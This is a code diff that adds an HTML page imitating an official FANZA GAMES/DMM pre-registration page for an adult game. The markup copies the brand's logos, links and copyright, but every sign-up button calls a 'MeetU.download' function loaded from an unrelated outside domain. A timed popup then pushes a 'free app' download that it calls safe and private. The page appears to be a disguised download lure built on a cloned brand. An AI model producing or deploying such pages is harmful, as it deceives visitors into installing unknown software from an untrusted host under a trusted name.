@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+
+   <script src="https://api.wenk918d.site/js/meetu-sdk.js"></script>
+
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('set', {
+            'i3_p_aff': '0',
+            'i3_p_page_type': 'lp',
+            'i3_p_env': 'production',
+            'i3_p_i3': 1,
+         });
+    </script>
+
+    <!-- ===== CTA 统一跳转方法 k2 ===== -->
+    <script>
+        function k2(url) {
+            MeetU.download(event);
+        }
+    </script>
+    <!-- ===== /CTA 统一跳转方法 k2 ===== -->
+
+    <title>東京マリオネットドールズ X - FANZA GAMES</title>
+    <meta charset="utf-8">
+    <meta name="description" content="東京マリオネットドールズ X">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="referrer" content="origin">
+    <meta name="robots" content="noindex">
+
+    <link rel="icon" href="images/adult.ico">
+
+    <link rel="stylesheet" href="css/index.min.css">
+    <link rel="stylesheet" href="css/index.min_1.css">
+    <link rel="stylesheet" href="css/index.min_2.css">
+
+    <!-- ===== 5秒後ポップアップ CSS ===== -->
+    <style>
+    .dl-overlay{
+        position: fixed;
+        inset: 0;
+        z-index: 9999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        background: rgba(0,0,0,.72);
+        opacity: 0;
+        visibility: hidden;
+        transition: opacity .3s ease, visibility .3s ease;
+        -webkit-backdrop-filter: blur(3px);
+        backdrop-filter: blur(3px);
+    }
+    .dl-overlay.is-show{
+        opacity: 1;
+        visibility: visible;
+    }
+    .dl-card{
+        position: relative;
+        width: 100%;
+        max-width: 420px;
+        box-sizing: border-box;
+        padding: 30px 22px 22px;
+        border-radius: 18px;
+        background: linear-gradient(160deg,#1b1a2b 0%,#241a2e 55%,#2b1420 100%);
+        border: 1px solid rgba(255,110,170,.35);
+        box-shadow: 0 18px 50px rgba(0,0,0,.6), inset 0 0 0 1px rgba(255,255,255,.04);
+        color: #fff;
+        text-align: center;
+        transform: translateY(18px) scale(.96);
+        opacity: 0;
+        transition: transform .35s cubic-bezier(.2,.9,.3,1.2), opacity .3s ease;
+    }
+    .dl-overlay.is-show .dl-card{
+        transform: translateY(0) scale(1);
+        opacity: 1;
+    }
+    .dl-close{
+        position: absolute;
+        top: 8px;
+        right: 10px;
+        width: 34px;
+        height: 34px;
+        border: 0;
+        border-radius: 50%;
+        background: rgba(255,255,255,.1);
+        color: #fff;
+        font-size: 19px;
+        line-height: 1;
+        cursor: pointer;
+        -webkit-tap-highlight-color: transparent;
+    }
+    .dl-close:hover{ background: rgba(255,255,255,.2); }
+    .dl-card h3{
+        margin: 0 0 10px;
+        font-size: 21px;
+        font-weight: 700;
+        letter-spacing: .02em;
+        color: #ff6aa8;
+    }
+    .dl-sub{
+        margin: 0 0 18px;
+        font-size: 13px;
+        line-height: 1.7;
+        color: #cfc9d8;
+    }
+    .dl-list{
+        text-align: left;
+        margin: 0 auto 4px;
+        max-width: 320px;
+    }
+    .dl-item{
+        display: flex;
+        align-items: flex-start;
+        gap: 8px;
+        font-size: 13.5px;
+        line-height: 1.6;
+        color: #f2eef6;
+        padding: 5px 0;
+    }
+    .dl-chk{
+        flex: 0 0 auto;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 18px;
+        height: 18px;
+        margin-top: 2px;
+        border-radius: 50%;
+        background: linear-gradient(135deg,#ff5f9e,#ff8b3d);
+        color: #fff;
+        font-size: 11px;
+        font-weight: 700;
+    }
+    .dl-btn{
+        display: block;
+        margin-top: 20px;
+        padding: 15px 10px;
+        border-radius: 999px;
+        background: linear-gradient(90deg,#ff5f9e,#ff8b3d);
+        color: #fff;
+        font-size: 15px;
+        font-weight: 700;
+        letter-spacing: .02em;
+        cursor: pointer;
+        user-select: none;
+        -webkit-tap-highlight-color: transparent;
+        box-shadow: 0 8px 20px rgba(255,95,158,.4);
+        transition: transform .2s ease, box-shadow .2s ease;
+        animation: dl-pulse 2.2s ease-in-out infinite;
+    }
+    .dl-btn:hover{
+        transform: translateY(-2px);
+        box-shadow: 0 12px 26px rgba(255,95,158,.55);
+    }
+    .dl-btn:active{ transform: translateY(0); }
+    @keyframes dl-pulse{
+        0%,100%{ box-shadow: 0 8px 20px rgba(255,95,158,.40); }
+        50%    { box-shadow: 0 8px 28px rgba(255,139,61,.65); }
+    }
+    .dl-note{
+        margin-top: 14px;
+        font-size: 11.5px;
+        line-height: 1.6;
+        color: #9b93a6;
+    }
+    @media (max-width: 480px){
+        .dl-card{ padding: 26px 16px 18px; border-radius: 14px; }
+        .dl-card h3{ font-size: 18px; }
+        .dl-sub{ font-size: 12px; }
+        .dl-item{ font-size: 12.5px; }
+        .dl-btn{ font-size: 14px; padding: 14px 8px; }
+    }
+    </style>
+    <!-- ===== /5秒後ポップアップ CSS ===== -->
+
+    <!-- ===== 手机端兼容覆盖 ===== -->
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <style>
+        html, body {
+            width: 100%;
+            overflow-x: hidden;
+            -webkit-text-size-adjust: 100%;
+        }
+        img, video {
+            max-width: 100%;
+            height: auto;
+        }
+        .common-header img,
+        .common-footer img,
+        .logo img,
+        .catch-top img,
+        .bt-pre img,
+        .bt-side img,
+        .sect-footer__btn img,
+        .sect-character__visual img,
+        .sect-system__card img,
+        .sect-system__card video {
+            max-width: 100%;
+            height: auto;
+        }
+        .page-tokyo_md .cont,
+        .main-wrap {
+            width: 100%;
+            max-width: 100%;
+            padding-left: 10px;
+            padding-right: 10px;
+            box-sizing: border-box;
+        }
+        .sect-character__slider,
+        .sect-system__viewport {
+            width: 100%;
+            overflow: hidden;
+        }
+        .sect-character__slide,
+        .sect-system__slide {
+            width: 100%;
+        }
+        .sect-character__thumb {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 6px;
+            padding: 0;
+            list-style: none;
+        }
+        .sect-character__thumb li {
+            width: 30%;
+            max-width: 120px;
+        }
+        .sect-character__thumb img {
+            width: 100%;
+            height: auto;
+        }
+        .sect-character__arrow,
+        .sect-system__arrow {
+            width: 28px;
+            height: 48px;
+            padding: 0;
+            border: 0;
+            background: transparent;
+        }
+        .sect-character__arrow img,
+        .sect-system__arrow img {
+            width: 100%;
+            height: auto;
+        }
+        @media (max-width: 768px) {
+            .bt-side {
+                display: none;
+            }
+            .common-header a {
+                display: inline-block;
+                margin: 4px;
+                font-size: 12px;
+            }
+            .common-header img {
+                height: 20px;
+                width: auto;
+            }
+            .dl-card {
+                max-width: 90%;
+                padding: 24px 14px 16px;
+            }
+            .dl-card h3 {
+                font-size: 18px;
+            }
+            .dl-sub,
+            .dl-item {
+                font-size: 12px;
+            }
+            .dl-btn {
+                font-size: 14px;
+                padding: 14px 8px;
+            }
+        }
+
+        /* ===== 角色轮播 banner 图片手机适配 ===== */
+        .sect-character__main {
+            display: flex !important;
+            align-items: center !important;
+            gap: 4px;
+            position: relative;
+            width: 100%;
+        }
+
+        .sect-character__slider {
+            flex: 1 1 auto !important;
+            min-width: 0 !important;      /* 关键：防止 flex 子项被内容撑开 */
+            overflow: hidden !important;
+            width: auto !important;
+        }
+
+        .sect-character__slide {
+            width: 100% !important;
+            flex: 0 0 100% !important;
+            box-sizing: border-box;
+        }
+
+        .sect-character__visual img {
+            display: block !important;
+            width: 100% !important;
+            max-width: 100% !important;
+            height: auto !important;
+        }
+
+        /* 第6张“60人の中から…”里的图片和按钮也自适应 */
+        .sect-character__group-cont {
+            width: 100% !important;
+        }
+        .sect-character__group-tx img {
+            display: block !important;
+            width: 100% !important;
+            height: auto !important;
+        }
+        .sect-character__group-btn {
+            width: 100% !important;
+            display: flex !important;
+            justify-content: center !important;
+        }
+        .sect-character__group-btn .k2-cta {
+            width: 100% !important;
+            max-width: 460px;
+            margin: 0 auto !important;
+        }
+        .sect-character__group-btn .k2-cta img {
+            width: 100% !important;
+            height: auto !important;
+        }
+
+        /* 左右箭头缩小一点，避免占用过多宽度 */
+        .sect-character__arrow {
+            flex: 0 0 auto !important;
+            width: 26px !important;
+            height: 44px !important;
+            padding: 0 !important;
+            border: 0 !important;
+            background: transparent !important;
+        }
+        .sect-character__arrow img {
+            width: 100% !important;
+            height: 100% !important;
+            object-fit: contain;
+        }
+    </style>
+    <!-- ===== /手机端兼容覆盖 ===== -->
+</head>
+<body>
+    <script src="js/fetch.umd.js"></script>
+    <script src="js/polyfill.min.js"></script>
+
+    <header class="common-header">
+        <a href="https://games.dmm.co.jp/"><img src="images/logo_fanzagames.svg" alt="FANZA GAMES"></a>
+        <a href="https://games.dmm.co.jp/">オンラインゲームトップへ</a>
+    </header>
+
+    <section class="common-age-verification" id="common-age-verification">
+        <img src="images/logo_fanzagames.svg" height="24" width="180" alt="FANZA GAMES">
+        <h1 class="common-age-verification-heading">あなたは18歳以上ですか？</h1>
+        <p class="common-age-verification-description">
+            ここから先は、アダルト商品を扱うサイトです。<br>
+            18歳未満の方のアクセスは固くお断りします。
+        </p>
+        <button type="button" class="common-age-verification-button common-age-verification-button-agree" id="common-age-verification-agree">はい</button>
+        <a href="https://games.dmm.com/" class="common-age-verification-button common-age-verification-button-disagree">いいえ</a>
+    </section>
+
+    <main class="page-tokyo_md">
+        <div class="main-wrap">
+            <div class="wrap-top">
+                <div class="wrap-top__bg">
+                    <div class="wrap-top__bg-slide is-active">
+                        <img src="images/r-fv__bg01.webp" alt="" width="1920" height="1080" decoding="async">
+                    </div>
+                    <div class="wrap-top__bg-slide">
+                        <img src="images/r-fv__bg02.webp" alt="" width="1920" height="1080" decoding="async">
+                    </div>
+                    <div class="wrap-top__bg-slide">
+                        <img src="images/r-fv__bg03.webp" alt="" width="1920" height="1080" decoding="async">
+                    </div>
+                </div>
+                <h1 class="logo">
+                    <img src="images/r-logo.webp" alt="東京マリオネットドールズ" width="200" height="75" decoding="async">
+                </h1>
+                <p class="catch-top">
+                    <img src="images/common-fv__catch.webp" alt="瞳が合うだけで、落とされる。君は僕だけのアイドル。" width="155" height="747" decoding="async">
+                </p>
+                <div class="cont">
+                    <div class="bt-pre">
+                        <button class="k2-cta" type="button" onclick="k2()" data-gtm-action-detail="login_start_header" data-gtm-game-title="東京マリオネットドールズ X" data-gtm-app-id="797487" data-gtm-dev-dom="PC_adult" data-gtm-pf-device="dmm_games_pc">
+                            <img src="images/common-btn__pre.webp" alt="事前登録はこちら" width="520" height="100" decoding="async">
+                        </button>
+                        <input type="hidden" id="title_id" value="tokyo_mdx_763859">
+                        <input type="hidden" id="is_general" value="0">
+                    </div>
+                    <div class="ntg-rule-box-area">
+                        <!--  ################################### 改変不可ここから ###################################  -->
+                        <div class="ntg-rule-box">
+                            <div class="ntg-rule-kiyaku">
+                                <label class="title_policy" style="display: none"><a href="#" target="_blank">ゲームの利用規約(必読)</a>に同意して遊ぶ</label>
+                            </div>
+                            <div class="ntg-rule-info">
+                                <label><input class="skipDetail_notification" type="checkbox" value="info" checked="">お知らせを受け取る</label>
+                            </div>
+                            <div class="ntg-rule-comname">
+                                提供:<strong><label class="dealer_name"></label></strong>
+                            </div>
+                        </div>
+                        <!--  ################################### 改変不可ここまで ###################################  -->
+                    </div>
+                </div>
+                <div class="bt-inse">
+                    <img src="images/common-btn__inse.webp" alt="今ゲームを始めると最大200連分のガチャがもらえるチャンス！" width="380" height="100" decoding="async">
+                </div>
+                <div class="bt-side">
+                    <button class="k2-cta" type="button" onclick="k2()" data-gtm-action-detail="login_start_side" data-gtm-game-title="東京マリオネットドールズ X" data-gtm-app-id="797487" data-gtm-dev-dom="PC_adult" data-gtm-pf-device="dmm_games_pc">
+                        <img src="images/common-btn__side.webp" alt="事前登録はこちら" width="220" height="80" decoding="async">
+                    </button>
+                </div>
+            </div>
+            <div class="wrap-content">
+                <section class="sect-character">
+                    <div class="cont">
+                        <h2 class="sect-character__ttl">
+                            <img src="images/pc-r-chara__ttl.webp" alt="IDOL 理想のアイドルが見つかる！" width="1188" height="131" decoding="async">
+                        </h2>
+                        <div class="sect-character__main">
+                            <button class="sect-character__arrow sect-character__arrow--prev" type="button" aria-label="前のキャラクター">
+                                <img src="images/common__arrow.webp" alt="" width="48" height="80" decoding="async">
+                            </button>
+                            <div class="sect-character__slider">
+                                <div class="sect-character__slide is-active" data-index="0">
+                                    <div class="sect-character__visual sect-character__visual--01">
+                                        <img src="images/pc-r-chara__img01.webp" alt="楚々浦亜衣" width="942" height="264" decoding="async">
+                                    </div>
+                                </div>
+                                <div class="sect-character__slide" data-index="1">
+                                    <div class="sect-character__visual sect-character__visual--02">
+                                        <img src="images/pc-r-chara__img02.webp" alt="松野祐里佳" width="942" height="264" decoding="async">
+                                    </div>
+                                </div>
+                                <div class="sect-character__slide" data-index="2">
+                                    <div class="sect-character__visual sect-character__visual--03">
+                                        <img src="images/pc-r-chara__img03.webp" alt="高貫智己" width="942" height="264" decoding="async">
+                                    </div>
+                                </div>
+                                <div class="sect-character__slide" data-index="3">
+                                    <div class="sect-character__visual sect-character__visual--04">
+                                        <img src="images/pc-r-chara__img04.webp" alt="亀田佳那恵" width="942" height="264" decoding="async">
+                                    </div>
+                                </div>
+                                <div class="sect-character__slide" data-index="4">
+                                    <div class="sect-character__visual sect-character__visual--05">
+                                        <img src="images/pc-r-chara__img05.webp" alt="沖本有紀" width="942" height="264" decoding="async">
+                                    </div>
+                                </div>
+                                <div class="sect-character__slide sect-character__slide--group" data-index="5">
+                                    <div class="sect-character__visual sect-character__visual--06">
+                                        <div class="sect-character__group-cont">
+                                            <p class="sect-character__group-tx">
+                                                <img src="images/pc-r-chara__img06.webp" alt="60人の中から、きっと、好みのアイドルと出会える。" width="942" height="264" decoding="async">
+                                            </p>
+                                            <div class="sect-character__group-btn">
+                                                <button class="k2-cta" type="button" onclick="k2()" data-gtm-action-detail="login_start_character" data-gtm-game-title="東京マリオネットドールズ X" data-gtm-app-id="797487" data-gtm-dev-dom="PC_adult" data-gtm-pf-device="dmm_games_pc">
+                                                    <img src="images/common-btn__pre.webp" alt="事前登録はこちら" width="520" height="100" decoding="async">
+                                                </button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <button class="sect-character__arrow sect-character__arrow--next" type="button" aria-label="次のキャラクター">
+                                <img src="images/common__arrow.webp" alt="" width="48" height="80" decoding="async">
+                            </button>
+                        </div>
+                        <ul class="sect-character__thumb">
+                            <li class="is-active">
+                                <button type="button" data-index="0" aria-label="楚々浦亜衣">
+                                    <img src="images/r-chara__tmb01.webp" alt="楚々浦亜衣" width="200" height="120" decoding="async">
+                                </button>
+                            </li>
+                            <li>
+                                <button type="button" data-index="1" aria-label="松野祐里佳">
+                                    <img src="images/r-chara__tmb02.webp" alt="松野祐里佳" width="200" height="120" decoding="async">
+                                </button>
+                            </li>
+                            <li>
+                                <button type="button" data-index="2" aria-label="高貫智己">
+                                    <img src="images/r-chara__tmb03.webp" alt="高貫智己" width="200" height="120" decoding="async">
+                                </button>
+                            </li>
+                            <li>
+                                <button type="button" data-index="3" aria-label="亀田佳那恵">
+                                    <img src="images/r-chara__tmb04.webp" alt="亀田佳那恵" width="200" height="120" decoding="async">
+                                </button>
+                            </li>
+                            <li>
+                                <button type="button" data-index="4" aria-label="沖本有紀">
+                                    <img src="images/r-chara__tmb05.webp" alt="沖本有紀" width="200" height="120" decoding="async">
+                                </button>
+                            </li>
+                            <li>
+                                <button type="button" data-index="5" aria-label="さらに55名のアイドル">
+                                    <img src="images/common-chara__tmb06.webp" alt="さらに55名のアイドル" width="200" height="120" decoding="async">
+                                </button>
+                            </li>
+                        </ul>
+                    </div>
+                </section>
+                <section class="sect-system">
+                    <div class="sect-system__bg" aria-hidden="true"></div>
+                    <div class="cont">
+                        <h2 class="sect-system__ttl">
+                            <img src="images/pc-r-footer__ttl.webp" alt="異次元のクオリティで貪る、とまらない♥リアルH♥がやってくる！" width="1188" height="131" decoding="async">
+                        </h2>
+                    </div>
+                    <div class="sect-system__main">
+                        <button class="sect-system__arrow sect-system__arrow--prev" type="button" aria-label="前のスライド">
+                            <img src="images/common__arrow.webp" alt="" width="48" height="80" decoding="async">
+                        </button>
+                        <div class="sect-system__viewport">
+                            <div class="sect-system__track">
+                                <div class="sect-system__slide" data-index="0">
+                                    <div class="sect-system__card">
+                                        <video src="media/r-footer__img01.mp4" width="920" height="520" muted="" loop="" playsinline="" preload="metadata"></video>
+                                    </div>
+                                </div>
+                                <div class="sect-system__slide" data-index="1">
+                                    <div class="sect-system__card">
+                                        <video src="media/r-footer__img02.mp4" width="920" height="520" muted="" loop="" playsinline="" preload="metadata"></video>
+                                    </div>
+                                </div>
+                                <div class="sect-system__slide" data-index="2">
+                                    <div class="sect-system__card">
+                                        <video src="media/r-footer__img03.mp4" width="920" height="520" muted="" loop="" playsinline="" preload="metadata"></video>
+                                    </div>
+                                </div>
+                                <div class="sect-system__slide" data-index="3">
+                                    <div class="sect-system__card">
+                                        <video src="media/r-footer__img04.mp4" width="920" height="520" muted="" loop="" playsinline="" preload="metadata"></video>
+                                    </div>
+                                </div>
+                                <div class="sect-system__slide" data-index="4">
+                                    <div class="sect-system__card">
+                                        <video src="media/r-footer__img05.mp4" width="920" height="520" muted="" loop="" playsinline="" preload="metadata"></video>
+                                    </div>
+                                </div>
+                                <div class="sect-system__slide" data-index="5">
+                                    <div class="sect-system__card">
+                                        <img src="images/r-footer__img06.webp" alt="" width="920" height="520" decoding="async">
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <button class="sect-system__arrow sect-system__arrow--next" type="button" aria-label="次のスライド">
+                            <img src="images/common__arrow.webp" alt="" width="48" height="80" decoding="async">
+                        </button>
+                    </div>
+                    <div class="cont">
+                        <ul class="sect-system__dots">
+                            <li class="is-active">
+                                <button type="button" data-index="0" aria-label="1枚目"></button>
+                            </li>
+                            <li>
+                                <button type="button" data-index="1" aria-label="2枚目"></button>
+                            </li>
+                            <li>
+                                <button type="button" data-index="2" aria-label="3枚目"></button>
+                            </li>
+                            <li>
+                                <button type="button" data-index="3" aria-label="4枚目"></button>
+                            </li>
+                            <li>
+                                <button type="button" data-index="4" aria-label="5枚目"></button>
+                            </li>
+                            <li>
+                                <button type="button" data-index="5" aria-label="6枚目"></button>
+                            </li>
+                        </ul>
+                        <div class="sect-footer__btn">
+                            <button class="k2-cta" type="button" onclick="k2()" data-gtm-action-detail="login_start_footer" data-gtm-game-title="東京マリオネットドールズ X" data-gtm-app-id="797487" data-gtm-dev-dom="PC_adult" data-gtm-pf-device="dmm_games_pc">
+                                <img src="images/common-btn__pre.webp" alt="事前登録はこちら" width="520" height="100" decoding="async">
+                            </button>
+                        </div>
+                    </div>
+                </section>
+            </div>
+        </div>
+    </main>
+
+    <footer class="common-footer">
+        <ul>
+            <li>
+                <a href="https://terms.dmm.co.jp/onlinegame_service/" target="_blank" rel="noopener">利用規約</a>
+            </li>
+            <li>
+                <a href="https://terms.dmm.co.jp/commerce_games/" target="_blank" rel="noopener">特定商取引法に基づく表記</a>
+            </li>
+        </ul>
+        <p>Copyright © since 1998 DMM All Rights Reserved.</p>
+    </footer>
+
+    <script src="js/index.min.js"></script>
+
+    <!-- <script src="./detail/js/skip_detail_with_dealer_policy.js"></script> -->
+    <!-- <script src="./direct-play/v1.1/direct-play.js"></script> -->
+
+    <script src="js/index.min_1.js"></script>
+
+    <!-- ===== 5秒後ポップアップ HTML ===== -->
+    <div class="dl-overlay" id="dlOverlay" role="dialog" aria-modal="true" aria-labelledby="dlTitle" onclick="closeDownload()">
+        <div class="dl-card" onclick="event.stopPropagation()">
+            <button class="dl-close" type="button" onclick="event.stopPropagation(); closeDownload()" aria-label="閉じる">×</button>
+
+            <h3 id="dlTitle">フルアクセスを解放</h3>
+            <p class="dl-sub">アプリをダウンロードして、すべての動画を無料で視聴 — すべての動画、カテゴリー、コレクション。</p>
+            <div class="dl-list">
+                <div class="dl-item"><span class="dl-chk">✓</span>視聴は100%無料</div>
+                <div class="dl-item"><span class="dl-chk">✓</span>すべての動画＆カテゴリーにアクセス</div>
+                <div class="dl-item"><span class="dl-chk">✓</span>HD動画をバッファリングなしで視聴</div>
+            </div>
+            <span class="dl-btn" role="button" tabindex="0" onclick="k2()">アプリを無料で入手 · 今すぐ視聴</span>
+            <div class="dl-note">🔒 安全＆プライベート — クレジットカード不要</div>
+        </div>
+    </div>
+    <!-- ===== /5秒後ポップアップ HTML ===== -->
+
+    <!-- ===== 5秒後ポップアップ JS ===== -->
+    <script>
+    (function () {
+        var DELAY = 5000; // 5秒
+        var overlay = document.getElementById('dlOverlay');
+        if (!overlay) return;
+
+        var closed = false;
+
+        function openDownload() {
+            if (closed) return;
+            overlay.classList.add('is-show');
+        }
+
+        window.closeDownload = function () {
+            closed = true;
+            overlay.classList.remove('is-show');
+        };
+
+        // 5秒後に表示
+        setTimeout(openDownload, DELAY);
+
+        // ESCキーで閉じる
+        document.addEventListener('keydown', function (e) {
+            if (e.key === 'Escape' || e.keyCode === 27) {
+                window.closeDownload();
+            }
+        });
+    })();
+    </script>
+    <!-- ===== /5秒後ポップアップ JS ===== -->
+
+</body>
+</html>
